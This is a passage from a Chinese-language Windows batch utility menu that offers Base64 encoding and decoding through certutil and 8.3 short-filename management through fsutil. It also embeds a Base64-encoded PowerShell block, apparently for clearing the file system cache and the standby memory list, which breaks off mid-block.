if "%errorlevel%" equ "1" goto 63-1
if "%errorlevel%" equ "2" goto 63-2
if "%errorlevel%" equ "3" goto memuv2
goto 63
set basexx=
set/p basexx=请输入你的选择:
set basexx="%basexx:|=%"
if !basexx!=="1" goto 63-1
if !basexx!=="2" goto 63-2
if !basexx!=="0" goto memuv2
echo 请输入正确的选项！
ping/n 2 0.0>nul
goto 63
:63-1
cls
del/f/q %temp%\codetmp>nul 2>nul
title Base解码%system%
set basebm=
set/p basebm=输入要解码的字符串或文件路径:
if "!basebm!"=="" goto 63-1
if not exist "!basebm!" (echo !basebm!>%temp%\tmp
certutil -decode -f %temp%\tmp %temp%\codetmp>nul&goto 63-11)
if "!basebm:~0,1!!basebm:~-1!" neq """" for /f "delims=" %%a in ('"echo !basebm!"') do (set !basebm!="%%~a")
dir/ad "!basebm!" >nul 2>nul&&echo 不能解码文件夹||goto 63-12
ping/n 2 0.0>nul
goto 63-1
:63-12
certutil -decode -f "!basebm!" %temp%\codetmp>nul
:63-11
cls
echo _______________________________________________________________________________
echo 输入内容: !basebm!
echo 解码内容:
if exist %temp%\codetmp (type %temp%\codetmp) else (echo 解码失败)
echo;
echo _______________________________________________________________________________
set bxz=
set/p bxz=输入"y"保存编码,其他输入返回上级菜单:
set bxz="%bxz:|=%"
if !bxz!=="y" goto 63(1)(2)
goto 63
:63(1)(2)
set basebc=
set/p basebc=输入保存路径:
echo _______________________________________________________________________________
copy/y/z %temp%\codetmp !basebc!
if %errorlevel% neq 0 (echo 保存失败) else (echo 保存成功)
echo _______________________________________________________________________________
echo 按任意键返回菜单&pause>nul
goto 63
:63-2
cls
del/f/q %temp%\codetmp>nul 2>nul
title Base编码%system%
set basebm=
set/p basebm=输入要编码的字符串或文件路径:
if "!basebm!"=="" goto 63-2
if not exist "!basebm!" (set /p =!basebm!<nul>%temp%\tmp
certutil -encode -f %temp%\tmp %temp%\codetmp>nul&goto 63-21)
if "!basebm:~0,1!!basebm:~-1!" neq """" for /f "delims=" %%a in ('"echo !basebm!"') do (set !basebm!="%%~a")
dir/ad "!basebm!" >nul 2>nul&&echo 不能编码文件夹||goto 63-22
ping/n 2 0.0>nul
goto 63-2
:63-22
certutil -encode -f "!basebm!" %temp%\codetmp>nul
:63-21
cls 
echo _______________________________________________________________________________
echo 输入内容: !basebm!
echo 编码内容:
for /f "delims=" %%a in (%temp%\codetmp) do (if "%%a" neq "-----BEGIN CERTIFICATE-----" (if "%%a" neq "-----END CERTIFICATE-----" (echo %%a)))
echo _______________________________________________________________________________
set bxz=
set/p bxz=输入"y"保存编码,其他输入返回上级菜单:
set bxz="%bxz:|=%"
if !bxz!=="y" goto 63(2)(2)
goto 63
:63(2)(2)
set basebc=
set/p basebc=输入保存路径:
echo _______________________________________________________________________________
copy/y/z %temp%\codetmp !basebc!
if %errorlevel% neq 0 (echo 保存失败) else (echo 保存成功)
echo _______________________________________________________________________________
echo 按任意键返回菜单&pause>nul
goto 63
:64
title 8.3短文件名管理%system%
cls
echo _______________________________________________________________________________
echo [1]查询8.3短文件名状态
echo [2]禁止8.3短文件名创建
echo [0]返回菜单
echo _______________________________________________________________________________
choice /c 120 /n /m 请输入你的选择:
if "%errorlevel%" equ "1" goto 64-1
if "%errorlevel%" equ "2" goto 64-2
if "%errorlevel%" equ "3" goto memuv2
goto 64
set name83=
set/p name83=请输入你的选择:
set name83="%name83:|=%"
if !name83!=="1" goto 64-1
if !name83!=="2" goto 64-2
if !name83!=="0" goto memuv2
echo 请输入正确的选项！
ping/n 2 0.0>nul
goto 64
:64-1
cls
fsutil fsinfo drives
set query83=
set/p query83=请输入要查询的盘符:
fsutil 8dot3name query %query83%:
echo _______________________________________________________________________________
echo 按任意键返回菜单&pause>nul
goto 64
:64-2
cls
fsutil 8dot3name set 1
echo _______________________________________________________________________________
echo 按任意键返回菜单&pause>nul
goto 64
:65
title 智能NTFS压缩%system%
cls
set url=
set/p url=请输入要压缩的文件夹:
set url="%url:|=%"
dir /ad !url!>nul 2>nul||echo 路径 !url! 不是一个文件夹&&timeout /t 2 /nobreak>nul&&goto 65
(
echo //5JAGYAIAAoAC0ATgBPAFQAIAAoAFsAUwBlAGMAdQByAGkAdAB5AC4AUAByAGkA
echo bgBjAGkAcABhAGwALgBXAGkAbgBkAG8AdwBzAFAAcgBpAG4AYwBpAHAAYQBsAF0A
echo IABbAFMAZQBjAHUAcgBpAHQAeQAuAFAAcgBpAG4AYwBpAHAAYQBsAC4AVwBpAG4A
echo ZABvAHcAcwBJAGQAZQBuAHQAaQB0AHkAXQA6ADoARwBlAHQAQwB1AHIAcgBlAG4A
echo dAAoACkAKQAuAEkAcwBJAG4AUgBvAGwAZQAoAGAADQAKACAAIAAgACAAWwBTAGUA
echo YwB1AHIAaQB0AHkALgBQAHIAaQBuAGMAaQBwAGEAbAAuAFcAaQBuAGQAbwB3AHMA
echo QgB1AGkAbAB0AEkAbgBSAG8AbABlAF0AIAAiAEEAZABtAGkAbgBpAHMAdAByAGEA
echo dABvAHIAIgApACkADQAKAHsADQAKACAAIAAgACAAVwByAGkAdABlAC0AVwBhAHIA
echo bgBpAG4AZwAgABwgWQBvAHUAIABkAG8AIABuAG8AdAAgAGgAYQB2AGUAIABBAGQA
echo bQBpAG4AaQBzAHQAcgBhAHQAbwByACAAcgBpAGcAaAB0AHMAIAB0AG8AIAByAHUA
echo bgAgAHQAaABpAHMAIABzAGMAcgBpAHAAdAAhAGAAbgBQAGwAZQBhAHMAZQAgAHIA
echo ZQAtAHIAdQBuACAAdABoAGkAcwAgAHMAYwByAGkAcAB0ACAAYQBzACAAYQBuACAA
echo QQBkAG0AaQBuAGkAcwB0AHIAYQB0AG8AcgAhAB0gDQAKACAAIAAgACAAQgByAGUA
echo YQBrAA0ACgB9AA0ACgANAAoAJABTAG8AdQByAGMAZQAgAD0AIABAACIADQAKAHUA
echo cwBpAG4AZwAgAFMAeQBzAHQAZQBtADsADQAKAHUAcwBpAG4AZwAgAFMAeQBzAHQA
echo ZQBtAC4AQwBvAG0AcABvAG4AZQBuAHQATQBvAGQAZQBsADsADQAKAHUAcwBpAG4A
echo ZwAgAFMAeQBzAHQAZQBtAC4AUgB1AG4AdABpAG0AZQAuAEkAbgB0AGUAcgBvAHAA
echo UwBlAHIAdgBpAGMAZQBzADsADQAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtAC4A
echo UwBlAGMAdQByAGkAdAB5AC4AUAByAGkAbgBjAGkAcABhAGwAOwANAAoADQAKAG4A
echo YQBtAGUAcwBwAGEAYwBlACAAQwBsAGUAYQByAFMAdABhAG4AZABiAHkATABpAHMA
echo dAANAAoAewANAAoAIAAgACAAIABwAHUAYgBsAGkAYwAgAGMAbABhAHMAcwAgAFAA
echo cgBvAGcAcgBhAG0ADQAKACAAIAAgACAAewANAAoAIAAgACAAIAAgACAAIAAgAGMA
echo bwBuAHMAdAAgAGkAbgB0ACAAUwBFAF8AUABSAEkAVgBJAEwARQBHAEUAXwBFAE4A
echo QQBCAEwARQBEACAAPQAgADIAOwANAAoAIAAgACAAIAAgACAAIAAgAGMAbwBuAHMA
echo dAAgAHMAdAByAGkAbgBnACAAUwBFAF8ASQBOAEMAUgBFAEEAUwBFAF8AUQBVAE8A
echo VABBAF8ATgBBAE0ARQAgAD0AIAAiAFMAZQBJAG4AYwByAGUAYQBzAGUAUQB1AG8A
echo dABhAFAAcgBpAHYAaQBsAGUAZwBlACIAOwANAAoAIAAgACAAIAAgACAAIAAgAGMA
echo bwBuAHMAdAAgAHMAdAByAGkAbgBnACAAUwBFAF8AUABSAE8ARgBJAEwARQBfAFMA
echo SQBOAEcATABFAF8AUABSAE8AQwBFAFMAUwBfAE4AQQBNAEUAIAA9ACAAIgBTAGUA
echo UAByAG8AZgBpAGwAZQBTAGkAbgBnAGwAZQBQAHIAbwBjAGUAcwBzAFAAcgBpAHYA
echo aQBsAGUAZwBlACIAOwANAAoAIAAgACAAIAAgACAAIAAgAGMAbwBuAHMAdAAgAGkA
echo bgB0ACAAUwB5AHMAdABlAG0ARgBpAGwAZQBDAGEAYwBoAGUASQBuAGYAbwByAG0A
echo YQB0AGkAbwBuACAAPQAgADAAeAAwADAAMQA1ADsADQAKACAAIAAgACAAIAAgACAA
echo IABjAG8AbgBzAHQAIABpAG4AdAAgAFMAeQBzAHQAZQBtAE0AZQBtAG8AcgB5AEwA
echo aQBzAHQASQBuAGYAbwByAG0AYQB0AGkAbwBuACAAPQAgADAAeAAwADAANQAwADsA
echo DQAKACAAIAAgACAAIAAgACAAIABjAG8AbgBzAHQAIABpAG4AdAAgAE0AZQBtAG8A
echo cgB5AFAAdQByAGcAZQBTAHQAYQBuAGQAYgB5AEwAaQBzAHQAIAA9ACAANAA7AA0A
echo CgANAAoAIAAgACAAIAAgACAAIAAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGEA
echo ZAB2AGEAcABpADMAMgAuAGQAbABsACIALAAgAFMAZQB0AEwAYQBzAHQARQByAHIA
echo bwByACAAPQAgAHQAcgB1AGUAKQBdAA0ACgAgACAAIAAgACAAIAAgACAAaQBuAHQA
echo ZQByAG4AYQBsACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAGIAbwBvAGwA
echo IABMAG8AbwBrAHUAcABQAHIAaQB2AGkAbABlAGcAZQBWAGEAbAB1AGUAKABzAHQA
echo cgBpAG4AZwAgAGgAbwBzAHQALAAgAHMAdAByAGkAbgBnACAAbgBhAG0AZQAsACAA
echo cgBlAGYAIABsAG8AbgBnACAAcABsAHUAaQBkACkAOwANAAoADQAKACAAIAAgACAA
echo IAAgACAAIABbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBhAGQAdgBhAHAAaQAzADIA
echo LgBkAGwAbAAiACwAIABTAGUAdABMAGEAcwB0AEUAcgByAG8AcgAgAD0AIAB0AHIA
echo dQBlACkAXQANAAoAIAAgACAAIAAgACAAIAAgAGkAbgB0AGUAcgBuAGEAbAAgAHMA
echo dABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABiAG8AbwBsACAAQQBkAGoAdQBzAHQA
echo VABvAGsAZQBuAFAAcgBpAHYAaQBsAGUAZwBlAHMAKABJAG4AdABQAHQAcgAgAGgA
echo dABvAGsALAAgAGIAbwBvAGwAIABkAGkAcwBhAGwAbAAsACAAcgBlAGYAIABUAG8A
echo awBQAHIAaQB2ADEATAB1AGkAZAAgAG4AZQB3AHMAdAAsACAAaQBuAHQAIABsAGUA
echo bgAsACAASQBuAHQAUAB0AHIAIABwAHIAZQB2ACwAIABJAG4AdABQAHQAcgAgAHIA
echo ZQBsAGUAbgApADsADQAKAA0ACgAgACAAIAAgACAAIAAgACAAWwBEAGwAbABJAG0A
echo cABvAHIAdAAoACIAbgB0AGQAbABsAC4AZABsAGwAIgApAF0ADQAKACAAIAAgACAA
echo IAAgACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4A
echo IABVAEkAbgB0ADMAMgAgAE4AdABTAGUAdABTAHkAcwB0AGUAbQBJAG4AZgBvAHIA
echo bQBhAHQAaQBvAG4AKABpAG4AdAAgAEkAbgBmAG8AQwBsAGEAcwBzACwAIABJAG4A
echo dABQAHQAcgAgAEkAbgBmAG8ALAAgAGkAbgB0ACAATABlAG4AZwB0AGgAKQA7AA0A
echo CgAgACAAIAAgACAAIAAgACAAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGIA
echo bwBvAGwAIABJAHMANgA0AEIAaQB0AE0AbwBkAGUAKAApAA0ACgAgACAAIAAgACAA
echo IAAgACAAewANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcgBlAHQAdQByAG4A
echo IABNAGEAcgBzAGgAYQBsAC4AUwBpAHoAZQBPAGYAKAB0AHkAcABlAG8AZgAoAEkA
echo bgB0AFAAdAByACkAKQAgAD0APQAgADgAOwANAAoAIAAgACAAIAAgACAAIAAgAH0A
echo DQAKAA0ACgAgACAAIAAgACAAIAAgACAAcwB0AGEAdABpAGMAIAB2AG8AaQBkACAA
echo TQBhAGkAbgAoAHMAdAByAGkAbgBnAFsAXQAgAGEAcgBnAHMAKQANAAoAIAAgACAA
echo IAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEMAbABlAGEA
echo cgBGAGkAbABlAFMAeQBzAHQAZQBtAEMAYQBjAGgAZQAoAHQAcgB1AGUAKQA7AA0A
echo CgAgACAAIAAgACAAIAAgACAAfQANAAoADQAKACAAIAAgACAAIAAgACAAIABwAHUA
echo YgBsAGkAYwAgAHMAdABhAHQAaQBjACAAdgBvAGkAZAAgAEMAbABlAGEAcgBGAGkA
echo bABlAFMAeQBzAHQAZQBtAEMAYQBjAGgAZQAoAGIAbwBvAGwAIABDAGwAZQBhAHIA
echo UwB0AGEAbgBkAGIAeQBDAGEAYwBoAGUAKQANAAoAIAAgACAAIAAgACAAIAAgAHsA
echo DQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHQAcgB5AA0ACgAgACAAIAAgACAA
echo IAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAA
echo IAAgAGkAZgAgACgAUwBlAHQASQBuAGMAcgBlAGEAcwBlAFAAcgBpAHYAaQBsAGUA
echo ZwBlACgAUwBFAF8ASQBOAEMAUgBFAEEAUwBFAF8AUQBVAE8AVABBAF8ATgBBAE0A
echo RQApACkADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAewANAAoA
echo IAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHUAaQBuAHQA
echo IABuAHUAbQAxADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAA
echo IAAgACAAIABpAG4AdAAgAFMAeQBzAHQAZQBtAEkAbgBmAG8ATABlAG4AZwB0AGgA
echo OwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEcA
echo QwBIAGEAbgBkAGwAZQAgAGcAYwBIAGEAbgBkAGwAZQA7AA0ACgAgACAAIAAgACAA
echo IAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAaQBmACAAKAAhAEkAcwA2ADQA
echo QgBpAHQATQBvAGQAZQAoACkAKQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAA
echo IAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAA
echo IAAgACAAIAAgACAAIAAgACAAIAAgAFMAWQBTAFQARQBNAF8AQwBBAEMASABFAF8A
echo SQBOAEYATwBSAE0AQQBUAEkATwBOACAAYwBhAGMAaABlAEkAbgBmAG8AcgBtAGEA
echo dABpAG8AbgAgAD0AIABuAGUAdwAgAFMAWQBTAFQARQBNAF8AQwBBAEMASABFAF8A
echo SQBOAEYATwBSAE0AQQBUAEkATwBOACgAKQA7AA0ACgAgACAAIAAgACAAIAAgACAA
echo IAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABjAGEAYwBoAGUASQBuAGYA
echo bwByAG0AYQB0AGkAbwBuAC4ATQBpAG4AaQBtAHUAbQBXAG8AcgBrAGkAbgBnAFMA
echo ZQB0ACAAPQAgAHUAaQBuAHQALgBNAGEAeABWAGEAbAB1AGUAOwANAAoAIAAgACAA
echo IAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYwBhAGMA
echo aABlAEkAbgBmAG8AcgBtAGEAdABpAG8AbgAuAE0AYQB4AGkAbQB1AG0AVwBvAHIA
echo awBpAG4AZwBTAGUAdAAgAD0AIAB1AGkAbgB0AC4ATQBhAHgAVgBhAGwAdQBlADsA
echo DQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAA
echo IAAgAFMAeQBzAHQAZQBtAEkAbgBmAG8ATABlAG4AZwB0AGgAIAA9ACAATQBhAHIA
echo cwBoAGEAbAAuAFMAaQB6AGUATwBmACgAYwBhAGMAaABlAEkAbgBmAG8AcgBtAGEA
echo dABpAG8AbgApADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAA
echo IAAgACAAIAAgACAAIAAgAGcAYwBIAGEAbgBkAGwAZQAgAD0AIABHAEMASABhAG4A
echo ZABsAGUALgBBAGwAbABvAGMAKABjAGEAYwBoAGUASQBuAGYAbwByAG0AYQB0AGkA
echo bwBuACwAIABHAEMASABhAG4AZABsAGUAVAB5AHAAZQAuAFAAaQBuAG4AZQBkACkA
echo OwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAA
echo IAAgACAAbgB1AG0AMQAgAD0AIABOAHQAUwBlAHQAUwB5AHMAdABlAG0ASQBuAGYA
echo bwByAG0AYQB0AGkAbwBuACgAUwB5AHMAdABlAG0ARgBpAGwAZQBDAGEAYwBoAGUA
echo SQBuAGYAbwByAG0AYQB0AGkAbwBuACwAIABnAGMASABhAG4AZABsAGUALgBBAGQA
echo ZAByAE8AZgBQAGkAbgBuAGUAZABPAGIAagBlAGMAdAAoACkALAAgAFMAeQBzAHQA
echo ZQBtAEkAbgBmAG8ATABlAG4AZwB0AGgAKQA7AA0ACgAgACAAIAAgACAAIAAgACAA
echo IAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABnAGMASABhAG4AZABsAGUA
echo LgBGAHIAZQBlACgAKQA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAA
echo IAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAA
echo IAAgACAAIAAgAGUAbABzAGUADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAA
echo IAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAA
echo IAAgACAAIAAgACAAIAAgACAAIABTAFkAUwBUAEUATQBfAEMAQQBDAEgARQBfAEkA
echo TgBGAE8AUgBNAEEAVABJAE8ATgBfADYANABfAEIASQBUACAAaQBuAGYAbwByAG0A
echo YQB0AGkAbwBuADYANABCAGkAdAAgAD0AIABuAGUAdwAgAFMAWQBTAFQARQBNAF8A
echo QwBBAEMASABFAF8ASQBOAEYATwBSAE0AQQBUAEkATwBOAF8ANgA0AF8AQgBJAFQA
echo KAApADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAA
echo IAAgACAAIAAgAGkAbgBmAG8AcgBtAGEAdABpAG8AbgA2ADQAQgBpAHQALgBNAGkA
echo bgBpAG0AdQBtAFcAbwByAGsAaQBuAGcAUwBlAHQAIAA9ACAALQAxAEwAOwANAAoA
echo IAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAA
echo aQBuAGYAbwByAG0AYQB0AGkAbwBuADYANABCAGkAdAAuAE0AYQB4AGkAbQB1AG0A
echo VwBvAHIAawBpAG4AZwBTAGUAdAAgAD0AIAAtADEATAA7AA0ACgAgACAAIAAgACAA
echo IAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABTAHkAcwB0AGUA
echo bQBJAG4AZgBvAEwAZQBuAGcAdABoACAAPQAgAE0AYQByAHMAaABhAGwALgBTAGkA
echo egBlAE8AZgAoAGkAbgBmAG8AcgBtAGEAdABpAG8AbgA2ADQAQgBpAHQAKQA7AA0A
echo CgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAA
echo IABnAGMASABhAG4AZABsAGUAIAA9ACAARwBDAEgAYQBuAGQAbABlAC4AQQBsAGwA
echo bwBjACgAaQBuAGYAbwByAG0AYQB0AGkAbwBuADYANABCAGkAdAAsACAARwBDAEgA
echo YQBuAGQAbABlAFQAeQBwAGUALgBQAGkAbgBuAGUAZAApADsADQAKACAAIAAgACAA
echo IAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAG4AdQBtADEA
echo IAA9ACAATgB0AFMAZQB0AFMAeQBzAHQAZQBtAEkAbgBmAG8AcgBtAGEAdABpAG8A
echo bgAoAFMAeQBzAHQAZQBtAEYAaQBsAGUAQwBhAGMAaABlAEkAbgBmAG8AcgBtAGEA
echo dABpAG8AbgAsACAAZwBjAEgAYQBuAGQAbABlAC4AQQBkAGQAcgBPAGYAUABpAG4A
echo bgBlAGQATwBiAGoAZQBjAHQAKAApACwAIABTAHkAcwB0AGUAbQBJAG4AZgBvAEwA
echo ZQBuAGcAdABoACkAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAA
echo IAAgACAAIAAgACAAIAAgACAAZwBjAEgAYQBuAGQAbABlAC4ARgByAGUAZQAoACkA
echo OwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0A
echo DQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABpAGYA
echo IAAoAG4AdQBtADEAIAAhAD0AIAAwACkADQAKACAAIAAgACAAIAAgACAAIAAgACAA
echo IAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHQAaAByAG8AdwAgAG4AZQB3ACAA
echo RQB4AGMAZQBwAHQAaQBvAG4AKAAiAE4AdABTAGUAdABTAHkAcwB0AGUAbQBJAG4A
echo ZgBvAHIAbQBhAHQAaQBvAG4AKABTAFkAUwBUAEUATQBDAEEAQwBIAEUASQBOAEYA
echo TwBSAE0AQQBUAEkATwBOACkAIABlAHIAcgBvAHIAOgAgACIALAAgAG4AZQB3ACAA
echo VwBpAG4AMwAyAEUAeABjAGUAcAB0AGkAbwBuACgATQBhAHIAcwBoAGEAbAAuAEcA
echo ZQB0AEwAYQBzAHQAVwBpAG4AMwAyAEUAcgByAG8AcgAoACkAKQApADsADQAKACAA
echo IAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAA
echo IAAgACAAIAAgACAAIAAgACAAIABpAGYAIAAoAEMAbABlAGEAcgBTAHQAYQBuAGQA
echo YgB5AEMAYQBjAGgAZQAgACYAJgAgAFMAZQB0AEkAbgBjAHIAZQBhAHMAZQBQAHIA
echo aQB2AGkAbABlAGcAZQAoAFMARQBfAFAAUgBPAEYASQBMAEUAXwBTAEkATgBHAEwA
echo RQBfAFAAUgBPAEMARQBTAFMAXwBOAEEATQBFACkAKQANAAoAIAAgACAAIAAgACAA
echo IAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgANAAoAIAAgACAAIAAgACAAIAAgACAA
echo IAAgACAAIAAgACAAIAAgACAAIAAgAGkAbgB0ACAAUwB5AHMAdABlAG0ASQBuAGYA
echo bwBMAGUAbgBnAHQAaAAgAD0AIABNAGEAcgBzAGgAYQBsAC4AUwBpAHoAZQBPAGYA
echo KABNAGUAbQBvAHIAeQBQAHUAcgBnAGUAUwB0AGEAbgBkAGIAeQBMAGkAcwB0ACkA
echo OwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEcA
echo QwBIAGEAbgBkAGwAZQAgAGcAYwBIAGEAbgBkAGwAZQAgAD0AIABHAEMASABhAG4A
echo ZABsAGUALgBBAGwAbABvAGMAKABNAGUAbQBvAHIAeQBQAHUAcgBnAGUAUwB0AGEA
echo bgBkAGIAeQBMAGkAcwB0ACwAIABHAEMASABhAG4AZABsAGUAVAB5AHAAZQAuAFAA
echo aQBuAG4AZQBkACkAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAA
echo IAAgACAAIAAgAHUAaQBuAHQAIABuAHUAbQAyACAAPQAgAE4AdABTAGUAdABTAHkA
echo cwB0AGUAbQBJAG4AZgBvAHIAbQBhAHQAaQBvAG4AKABTAHkAcwB0AGUAbQBNAGUA
echo bQBvAHIAeQBMAGkAcwB0AEkAbgBmAG8AcgBtAGEAdABpAG8AbgAsACAAZwBjAEgA
echo YQBuAGQAbABlAC4AQQBkAGQAcgBPAGYAUABpAG4AbgBlAGQATwBiAGoAZQBjAHQA
echo KAApACwAIABTAHkAcwB0AGUAbQBJAG4AZgBvAEwAZQBuAGcAdABoACkAOwANAAoA
echo IAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGcAYwBIAGEA
echo bgBkAGwAZQAuAEYAcgBlAGUAKAApADsADQAKACAAIAAgACAAIAAgACAAIAAgACAA
echo IAAgACAAIAAgACAAIAAgACAAIABpAGYAIAAoAG4AdQBtADIAIAAhAD0AIAAwACkA
echo DQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAA
echo IAAgAHQAaAByAG8AdwAgAG4AZQB3ACAARQB4AGMAZQBwAHQAaQBvAG4AKAAiAE4A
echo dABTAGUAdABTAHkAcwB0AGUAbQBJAG4AZgBvAHIAbQBhAHQAaQBvAG4AKABTAFkA
echo UwBUAEUATQBNAEUATQBPAFIAWQBMAEkAUwBUAEkATgBGAE8AUgBNAEEAVABJAE8A
echo TgApACAAZQByAHIAbwByADoAIAAiACwAIABuAGUAdwAgAFcAaQBuADMAMgBFAHgA
echo YwBlAHAAdABpAG8AbgAoAE0AYQByAHMAaABhAGwALgBHAGUAdABMAGEAcwB0AFcA
echo aQBuADMAMgBFAHIAcgBvAHIAKAApACkAKQA7AA0ACgAgACAAIAAgACAAIAAgACAA
echo IAAgACAAIAAgACAAIAAgAH0ADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0A
echo DQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGMAYQB0AGMAaAAgACgARQB4AGMA
echo ZQBwAHQAaQBvAG4AIABlAHgAKQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAA
echo ewANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABDAG8AbgBzAG8A
echo bABlAC4AVwByAGkAdABlACgAZQB4AC4AVABvAFMAdAByAGkAbgBnACgAKQApADsA
echo DQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0ADQAKACAAIAAgACAAIAAgACAA
echo IAB9AA0ACgANAAoAIAAgACAAIAAgACAAIAAgAHAAcgBpAHYAYQB0AGUAIABzAHQA
echo YQB0AGkAYwAgAGIAbwBvAGwAIABTAGUAdABJAG4AYwByAGUAYQBzAGUAUAByAGkA
echo dgBpAGwAZQBnAGUAKABzAHQAcgBpAG4AZwAgAHAAcgBpAHYAaQBsAGUAZwBlAE4A
echo YQBtAGUAKQANAAoAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAA
echo IAAgACAAIAAgAHUAcwBpAG4AZwAgACgAVwBpAG4AZABvAHcAcwBJAGQAZQBuAHQA
echo aQB0AHkAIABjAHUAcgByAGUAbgB0ACAAPQAgAFcAaQBuAGQAbwB3AHMASQBkAGUA
echo bgB0AGkAdAB5AC4ARwBlAHQAQwB1AHIAcgBlAG4AdAAoAFQAbwBrAGUAbgBBAGMA
echo YwBlAHMAcwBMAGUAdgBlAGwAcwAuAFEAdQBlAHIAeQAgAHwAIABUAG8AawBlAG4A
echo QQBjAGMAZQBzAHMATABlAHYAZQBsAHMALgBBAGQAagB1AHMAdABQAHIAaQB2AGkA
echo bABlAGcAZQBzACkAKQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAewANAAoA
echo IAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABUAG8AawBQAHIAaQB2ADEA
echo TAB1AGkAZAAgAG4AZQB3AHMAdAA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAA
echo IAAgACAAIAAgAG4AZQB3AHMAdAAuAEMAbwB1AG4AdAAgAD0AIAAxADsADQAKACAA
echo IAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAbgBlAHcAcwB0AC4ATAB1AGkA
echo ZAAgAD0AIAAwAEwAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAA
echo IABuAGUAdwBzAHQALgBBAHQAdAByACAAPQAgAFMARQBfAFAAUgBJAFYASQBMAEUA
echo RwBFAF8ARQBOAEEAQgBMAEUARAA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAA
echo IAAgACAAIAAgAGkAZgAgACgAIQBMAG8AbwBrAHUAcABQAHIAaQB2AGkAbABlAGcA
echo ZQBWAGEAbAB1AGUAKABuAHUAbABsACwAIABwAHIAaQB2AGkAbABlAGcAZQBOAGEA
echo bQBlACwAIAByAGUAZgAgAG4AZQB3AHMAdAAuAEwAdQBpAGQAKQApAA0ACgAgACAA
echo IAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAdABoAHIAbwB3ACAA
echo bgBlAHcAIABFAHgAYwBlAHAAdABpAG8AbgAoACIARQByAHIAbwByACAAaQBuACAA
echo TABvAG8AawB1AHAAUAByAGkAdgBpAGwAZQBnAGUAVgBhAGwAdQBlADoAIAAiACwA
echo IABuAGUAdwAgAFcAaQBuADMAMgBFAHgAYwBlAHAAdABpAG8AbgAoAE0AYQByAHMA
echo aABhAGwALgBHAGUAdABMAGEAcwB0AFcAaQBuADMAMgBFAHIAcgBvAHIAKAApACkA
echo KQA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGkAbgB0ACAA
echo bgB1AG0AIAA9ACAAQQBkAGoAdQBzAHQAVABvAGsAZQBuAFAAcgBpAHYAaQBsAGUA
